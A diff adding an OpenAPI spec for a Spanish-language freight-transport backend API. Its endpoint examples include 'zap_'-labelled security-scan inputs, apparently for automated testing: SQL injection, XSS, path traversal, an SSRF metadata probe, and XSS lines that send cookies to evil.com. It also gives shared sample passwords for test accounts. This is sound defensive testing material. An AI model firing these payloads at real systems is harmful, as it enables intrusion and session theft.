@@ -1,0 +1,618 @@
+openapi: 3.0.3
+info:
+  title: Nanutech Backend API
+  description: |
+    API de gestión de transporte de carga pesada.
+    Roles: ADMIN, GERENTE, CHOFER.
+    Auth: Bearer token desde POST /auth/login.
+  version: "1.0.0"
+
+servers:
+  # API_URL_PLACEHOLDER → reemplazado por sed en el workflow con la URL real
+  - url: "API_URL_PLACEHOLDER"
+    description: Ambiente de testing
+
+components:
+  securitySchemes:
+    BearerAuth:
+      type: http
+      scheme: bearer
+      bearerFormat: JWT
+
+  schemas:
+    LoginRequest:
+      type: object
+      required: [email, password]
+      properties:
+        email: { type: string, format: email, example: admin@nanutech.com }
+        password: { type: string, example: "Admin123!" }
+
+    CreateCamionRequest:
+      type: object
+      required: [placa, marca, modelo, anio, capacidad_ton, vin, color, combustible, gps]
+      properties:
+        placa: { type: string, example: "ZAP-001" }
+        marca: { type: string, example: "Volvo" }
+        modelo: { type: string, example: "FH16" }
+        anio: { type: integer, minimum: 1990, maximum: 2027, example: 2023 }
+        capacidad_ton: { type: number, minimum: 0.1, example: 20.0 }
+        vin: { type: string, example: "VINZAP0000001" }
+        color: { type: string, example: "Blanco" }
+        combustible: { type: string, enum: [DIESEL, GASOLINA, GNV, GLP, ELECTRICO, HIBRIDO], example: "DIESEL" }
+        gps: { type: boolean, example: true }
+        estado: { type: string, enum: [DISPONIBLE, EN_JORNADA, EN_AUXILIO, MANTENIMIENTO, INACTIVA] }
+        kilometraje_actual: { type: number, example: 0 }
+        notas: { type: string, example: "Unidad nueva" }
+
+    CreateJornadaRequest:
+      type: object
+      required: [conductor_id, unidad_id, contrato_id, fecha_jornada, origen, destino, km_estimados]
+      properties:
+        conductor_id: { type: string, format: uuid, example: "22222222-2222-2222-2222-222222222222" }
+        unidad_id: { type: string, format: uuid, example: "aaaa0001-0000-0000-0000-000000000001" }
+        contrato_id: { type: string, format: uuid, example: "bbbb0001-0000-0000-0000-000000000001" }
+        fecha_jornada: { type: string, format: date, example: "2026-05-21" }
+        origen: { type: string, example: "Lima" }
+        destino: { type: string, example: "Arequipa" }
+        km_estimados: { type: number, example: 520 }
+        tipo_carga: { type: string, example: "Mineral concentrado" }
+        peso_carga_ton: { type: number, example: 18.5 }
+
+    CreateContratoRequest:
+      type: object
+      required: [codigo, cliente, tipo_servicio, fecha_inicio]
+      properties:
+        codigo: { type: string, example: "CONT-ZAP-001" }
+        cliente: { type: string, example: "Empresa Test SA" }
+        ruc: { type: string, example: "20123456799" }
+        descripcion: { type: string, example: "Contrato de prueba" }
+        tipo_servicio: { type: string, enum: [POR_VIAJE, POR_HORA, POR_TONELADA, POR_KM, MENSUAL] }
+        fecha_inicio: { type: string, format: date, example: "2026-01-01" }
+        fecha_fin: { type: string, format: date, example: "2026-12-31" }
+        tarifa: { type: number, example: 15000 }
+        moneda: { type: string, example: "PEN" }
+
+    ErrorResponse:
+      type: object
+      properties:
+        success: { type: boolean, example: false }
+        message: { type: string }
+        code: { type: string }
+
+  responses:
+    Unauthorized:
+      description: Token ausente o inválido
+      content:
+        application/json:
+          schema: { $ref: '#/components/schemas/ErrorResponse' }
+          example: { success: false, message: "Token de acceso requerido", code: "TOKEN_REQUIRED" }
+    Forbidden:
+      description: Rol sin acceso
+      content:
+        application/json:
+          schema: { $ref: '#/components/schemas/ErrorResponse' }
+          example: { success: false, message: "Acceso denegado", code: "FORBIDDEN" }
+
+security:
+  - BearerAuth: []
+
+paths:
+
+  /auth/login:
+    post:
+      summary: Iniciar sesión (público)
+      tags: [Auth]
+      security: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/LoginRequest' }
+            examples:
+              admin_valido:
+                value: { email: "admin@nanutech.com", password: "Admin123!" }
+              gerente_valido:
+                value: { email: "gerente@nanutech.com", password: "Admin123!" }
+              chofer_valido:
+                value: { email: "chofer@nanutech.com", password: "Admin123!" }
+              zap_sqli_email:
+                value: { email: "' OR '1'='1' --", password: "x" }
+              zap_sqli_union:
+                value: { email: "' UNION SELECT correo,password FROM usuarios --", password: "x" }
+              zap_xss_email:
+                value: { email: "<script>alert(document.cookie)</script>@x.com", password: "test" }
+              zap_xss_svg:
+                value: { email: "<svg/onload=alert(1)>@x.com", password: "test" }
+      responses:
+        '200': { description: Login exitoso }
+        '400': { description: Datos inválidos }
+        '401': { description: Credenciales incorrectas }
+        '423': { description: Cuenta bloqueada }
+
+  /auth/forgot-password:
+    post:
+      summary: Recuperar contraseña (público)
+      tags: [Auth]
+      security: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [email]
+              properties:
+                email: { type: string, format: email, example: admin@nanutech.com }
+            examples:
+              valido: { value: { email: "admin@nanutech.com" } }
+              zap_sqli: { value: { email: "' OR '1'='1" } }
+              zap_xss: { value: { email: "<script>alert(1)</script>@x.com" } }
+      responses:
+        '200': { description: Correo enviado }
+        '400': { description: Email inválido }
+
+  /auth/forgot-password/confirm:
+    post:
+      summary: Confirmar nueva contraseña (público)
+      tags: [Auth]
+      security: []
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [email, code, newPassword]
+              properties:
+                email: { type: string, format: email, example: admin@nanutech.com }
+                code: { type: string, example: "123456" }
+                newPassword: { type: string, example: "NuevoPass123!" }
+            examples:
+              valido: { value: { email: "admin@nanutech.com", code: "123456", newPassword: "NuevoPass123!" } }
+              zap_sqli: { value: { email: "admin@nanutech.com", code: "' OR '1'='1", newPassword: "x" } }
+      responses:
+        '200': { description: Contraseña actualizada }
+        '401': { description: Código inválido }
+        '404': { description: Usuario no encontrado }
+
+  /auth/me:
+    get:
+      summary: Sesión actual (ADMIN, GERENTE, CHOFER)
+      tags: [Auth]
+      responses:
+        '200': { description: Datos del usuario autenticado }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+
+  /camiones:
+    get:
+      summary: Listar camiones (solo ADMIN)
+      tags: [Camiones]
+      parameters:
+        - name: placa
+          in: query
+          schema: { type: string }
+          examples:
+            normal: { value: "ABC" }
+            zap_sqli: { value: "' OR '1'='1" }
+            zap_sqli_drop: { value: "'; DROP TABLE unidades; --" }
+            zap_xss: { value: "<script>alert(1)</script>" }
+            zap_traversal: { value: "../../../etc/passwd" }
+        - name: estado
+          in: query
+          schema: { type: string, enum: [DISPONIBLE, EN_JORNADA, EN_AUXILIO, MANTENIMIENTO, INACTIVA, TODOS] }
+      responses:
+        '200': { description: Lista de camiones }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+    post:
+      summary: Crear camión (solo ADMIN)
+      tags: [Camiones]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/CreateCamionRequest' }
+            examples:
+              valido:
+                value: { placa: "ZAP-001", marca: "Volvo", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINZAP0000001", color: "Blanco", combustible: "DIESEL", gps: true }
+              zap_sqli_placa:
+                value: { placa: "'; DROP TABLE unidades; --", marca: "Test", modelo: "Test", anio: 2023, capacidad_ton: 10, vin: "VIN1234567890", color: "Rojo", combustible: "DIESEL", gps: false }
+              zap_sqli_vin:
+                value: { placa: "ZAP-002", marca: "Test", modelo: "Test", anio: 2023, capacidad_ton: 10, vin: "' OR '1'='1", color: "Rojo", combustible: "DIESEL", gps: false }
+              zap_xss_marca:
+                value: { placa: "ZAP-XSS1", marca: "<img src=x onerror=alert(document.cookie)>", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINXSS00001", color: "Azul", combustible: "DIESEL", gps: true }
+              zap_xss_notas:
+                value: { placa: "ZAP-XSS2", marca: "Volvo", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINXSS00002", color: "Negro", combustible: "DIESEL", gps: true, notas: "<script>fetch('https://evil.com?c='+document.cookie)</script>" }
+              zap_ssrf:
+                value: { placa: "ZAP-SSRF", marca: "Volvo", modelo: "FH16", anio: 2023, capacidad_ton: 20, vin: "VINSSRF0001", color: "Blanco", combustible: "DIESEL", gps: true, notas: "http://169.254.169.254/latest/meta-data/" }
+      responses:
+        '201': { description: Camión creado }
+        '400': { description: Error de validación }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /camiones/{id}:
+    get:
+      summary: Obtener camión por ID (solo ADMIN)
+      tags: [Camiones]
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string }
+          examples:
+            valido: { value: "aaaa0001-0000-0000-0000-000000000001" }
+            zap_sqli: { value: "' OR '1'='1" }
+            zap_sqli_union: { value: "1 UNION SELECT correo,password,rol,4,5,6,7,8,9,10 FROM usuarios--" }
+            zap_traversal: { value: "../../etc/passwd" }
+            zap_xss: { value: "<script>alert(1)</script>" }
+      responses:
+        '200': { description: Detalle del camión }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+        '404': { description: No encontrado }
+
+  /camiones/panel:
+    get:
+      summary: Panel de monitoreo (solo ADMIN)
+      tags: [Camiones]
+      parameters:
+        - name: placa
+          in: query
+          schema: { type: string }
+          examples:
+            normal: { value: "ABC" }
+            zap_sqli: { value: "' OR '1'='1" }
+        - name: estado
+          in: query
+          schema: { type: string, enum: [DISPONIBLE, EN_JORNADA, MANTENIMIENTO, TODOS] }
+      responses:
+        '200': { description: Panel con resumen }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /camiones/exportar/csv:
+    get:
+      summary: Exportar camiones CSV (solo ADMIN)
+      tags: [Camiones]
+      parameters:
+        - name: placa
+          in: query
+          schema: { type: string }
+        - name: estado
+          in: query
+          schema: { type: string }
+      responses:
+        '200':
+          description: Archivo CSV
+          content:
+            text/csv:
+              schema: { type: string }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /dashboard:
+    get:
+      summary: Dashboard admin (solo ADMIN)
+      tags: [Dashboard]
+      responses:
+        '200': { description: Datos del dashboard }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /dashboard/gerencial:
+    get:
+      summary: Dashboard gerencial (solo GERENTE)
+      tags: [Dashboard]
+      responses:
+        '200': { description: Datos gerenciales }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /jornadas:
+    get:
+      summary: Listar jornadas (ADMIN, GERENTE)
+      tags: [Jornadas]
+      parameters:
+        - name: estado
+          in: query
+          schema: { type: string, enum: [REGISTRADA, PENDIENTE, EN_PROCESO, COMPLETADA, CANCELADA] }
+        - name: fecha_jornada
+          in: query
+          schema: { type: string, format: date, example: "2026-05-21" }
+      responses:
+        '200': { description: Lista de jornadas }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+    post:
+      summary: Crear jornada (ADMIN, GERENTE)
+      tags: [Jornadas]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/CreateJornadaRequest' }
+            examples:
+              valido:
+                value: { conductor_id: "22222222-2222-2222-2222-222222222222", unidad_id: "aaaa0001-0000-0000-0000-000000000001", contrato_id: "bbbb0001-0000-0000-0000-000000000001", fecha_jornada: "2026-05-21", origen: "Lima", destino: "Arequipa", km_estimados: 520 }
+              zap_xss_origen:
+                value: { conductor_id: "22222222-2222-2222-2222-222222222222", unidad_id: "aaaa0001-0000-0000-0000-000000000001", contrato_id: "bbbb0001-0000-0000-0000-000000000001", fecha_jornada: "2026-05-21", origen: "<script>alert(1)</script>", destino: "Arequipa", km_estimados: 520 }
+              zap_xss_destino:
+                value: { conductor_id: "22222222-2222-2222-2222-222222222222", unidad_id: "aaaa0001-0000-0000-0000-000000000001", contrato_id: "bbbb0001-0000-0000-0000-000000000001", fecha_jornada: "2026-05-21", origen: "Lima", destino: "<img src=x onerror=alert(document.cookie)>", km_estimados: 520 }
+              zap_sqli:
+                value: { conductor_id: "' OR '1'='1", unidad_id: "aaaa0001-0000-0000-0000-000000000001", contrato_id: "bbbb0001-0000-0000-0000-000000000001", fecha_jornada: "2026-05-21", origen: "Lima", destino: "Arequipa", km_estimados: 520 }
+      responses:
+        '201': { description: Jornada creada }
+        '400': { description: Error de validación }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /jornadas/actual/{conductorId}:
+    get:
+      summary: Jornada actual del conductor (solo CHOFER)
+      tags: [Jornadas]
+      parameters:
+        - name: conductorId
+          in: path
+          required: true
+          schema: { type: string, format: uuid }
+          examples:
+            valido: { value: "22222222-2222-2222-2222-222222222222" }
+            zap_sqli: { value: "' OR '1'='1" }
+            zap_traversal: { value: "../../etc/passwd" }
+      responses:
+        '200': { description: Jornada actual }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+        '404': { description: Sin jornada activa }
+
+  /jornadas/iniciar:
+    post:
+      summary: Iniciar jornada (solo CHOFER)
+      tags: [Jornadas]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [jornada_id]
+              properties:
+                jornada_id: { type: string, format: uuid, example: "cccc0002-0000-0000-0000-000000000002" }
+            examples:
+              valido: { value: { jornada_id: "cccc0002-0000-0000-0000-000000000002" } }
+              zap_sqli: { value: { jornada_id: "' OR '1'='1" } }
+      responses:
+        '200': { description: Jornada iniciada }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /jornadas/finalizar:
+    post:
+      summary: Finalizar jornada (solo CHOFER)
+      tags: [Jornadas]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [jornada_id]
+              properties:
+                jornada_id: { type: string, format: uuid, example: "cccc0002-0000-0000-0000-000000000002" }
+                km_recorridos: { type: number, example: 300 }
+                observaciones: { type: string, example: "Sin incidencias" }
+            examples:
+              valido: { value: { jornada_id: "cccc0002-0000-0000-0000-000000000002", km_recorridos: 300, observaciones: "Sin incidencias" } }
+              zap_xss: { value: { jornada_id: "cccc0002-0000-0000-0000-000000000002", km_recorridos: 300, observaciones: "<script>alert(document.cookie)</script>" } }
+              zap_sqli: { value: { jornada_id: "' OR '1'='1", km_recorridos: 0, observaciones: "test" } }
+      responses:
+        '200': { description: Jornada finalizada }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /jornadas/exportar:
+    get:
+      summary: Exportar jornadas (ADMIN, GERENTE)
+      tags: [Jornadas]
+      responses:
+        '200': { description: Exportación de jornadas }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /gps/proveedores:
+    get:
+      summary: Proveedores GPS (solo ADMIN)
+      tags: [GPS]
+      responses:
+        '200': { description: Lista de proveedores }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /gps/plantilla:
+    get:
+      summary: Plantilla GPS genérica (solo ADMIN)
+      tags: [GPS]
+      responses:
+        '200': { description: Plantilla CSV/XLSX }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /gps/plantilla/{proveedor}:
+    get:
+      summary: Plantilla GPS por proveedor (solo ADMIN)
+      tags: [GPS]
+      parameters:
+        - name: proveedor
+          in: path
+          required: true
+          schema: { type: string, enum: [GPSCONTROL, GLOBALGPS, OTRO] }
+          examples:
+            valido: { value: "GPSCONTROL" }
+            zap_traversal: { value: "GPSCONTROL/../../../etc/passwd" }
+            zap_sqli: { value: "' OR '1'='1" }
+      responses:
+        '200': { description: Plantilla del proveedor }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /gps/validar:
+    post:
+      summary: Validar archivo GPS (solo ADMIN)
+      tags: [GPS]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                proveedor: { type: string, enum: [GPSCONTROL, GLOBALGPS, OTRO] }
+            examples:
+              valido: { value: { proveedor: "GPSCONTROL" } }
+              zap_sqli: { value: { proveedor: "' OR '1'='1" } }
+      responses:
+        '200': { description: Resultado de validación }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /gps/importar:
+    post:
+      summary: Importar GPS (solo ADMIN)
+      tags: [GPS]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              properties:
+                proveedor: { type: string, enum: [GPSCONTROL, GLOBALGPS, OTRO] }
+            examples:
+              valido: { value: { proveedor: "GPSCONTROL" } }
+      responses:
+        '200': { description: Importación procesada }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /gps/resumen:
+    get:
+      summary: Resumen GPS (solo ADMIN)
+      tags: [GPS]
+      responses:
+        '200': { description: Resumen GPS }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /gps/registros:
+    get:
+      summary: Registros GPS (solo ADMIN)
+      tags: [GPS]
+      parameters:
+        - name: unidad_id
+          in: query
+          schema: { type: string, format: uuid }
+          examples:
+            valido: { value: "aaaa0001-0000-0000-0000-000000000001" }
+            zap_sqli: { value: "' OR '1'='1" }
+        - name: fecha_inicio
+          in: query
+          schema: { type: string, format: date, example: "2026-04-01" }
+        - name: fecha_fin
+          in: query
+          schema: { type: string, format: date, example: "2026-05-21" }
+      responses:
+        '200': { description: Lista de registros GPS }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /conductores:
+    get:
+      summary: Listar conductores (ADMIN, GERENTE)
+      tags: [Conductores]
+      responses:
+        '200': { description: Lista de conductores }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /contratos:
+    get:
+      summary: Listar contratos (solo GERENTE)
+      tags: [Contratos]
+      responses:
+        '200': { description: Lista de contratos }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+    post:
+      summary: Crear contrato (solo GERENTE)
+      tags: [Contratos]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema: { $ref: '#/components/schemas/CreateContratoRequest' }
+            examples:
+              valido:
+                value: { codigo: "CONT-ZAP-001", cliente: "Empresa Test SA", ruc: "20123456799", tipo_servicio: "POR_VIAJE", fecha_inicio: "2026-01-01", tarifa: 15000, moneda: "PEN" }
+              zap_xss_cliente:
+                value: { codigo: "CONT-XSS-001", cliente: "<script>alert(document.cookie)</script>", tipo_servicio: "POR_VIAJE", fecha_inicio: "2026-01-01" }
+              zap_xss_descripcion:
+                value: { codigo: "CONT-XSS-002", cliente: "Test", descripcion: "<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>", tipo_servicio: "POR_VIAJE", fecha_inicio: "2026-01-01" }
+              zap_sqli_codigo:
+                value: { codigo: "' OR '1'='1", cliente: "Test", tipo_servicio: "POR_VIAJE", fecha_inicio: "2026-01-01" }
+              zap_sqli_cliente:
+                value: { codigo: "CONT-SQLI-001", cliente: "' UNION SELECT correo,password FROM usuarios--", tipo_servicio: "POR_VIAJE", fecha_inicio: "2026-01-01" }
+      responses:
+        '201': { description: Contrato creado }
+        '400': { description: Error de validación }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /contratos/{id}:
+    get:
+      summary: Obtener contrato por ID (solo GERENTE)
+      tags: [Contratos]
+      parameters:
+        - name: id
+          in: path
+          required: true
+          schema: { type: string, format: uuid }
+          examples:
+            valido: { value: "bbbb0001-0000-0000-0000-000000000001" }
+            zap_sqli: { value: "' OR '1'='1" }
+            zap_traversal: { value: "../../etc/passwd" }
+      responses:
+        '200': { description: Detalle del contrato }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+        '404': { description: No encontrado }
+
+  /contratos/indicadores:
+    get:
+      summary: Indicadores de contratos (solo GERENTE)
+      tags: [Contratos]
+      responses:
+        '200': { description: KPIs de contratos }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /contratos/vigentes:
+    get:
+      summary: Contratos vigentes (ADMIN, GERENTE)
+      tags: [Contratos]
+      responses:
+        '200': { description: Contratos activos }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
+
+  /unidades/disponibles:
+    get:
+      summary: Unidades disponibles (ADMIN, GERENTE)
+      tags: [Unidades]
+      responses:
+        '200': { description: Unidades con estado DISPONIBLE }
+        '401': { $ref: '#/components/responses/Unauthorized' }
+        '403': { $ref: '#/components/responses/Forbidden' }
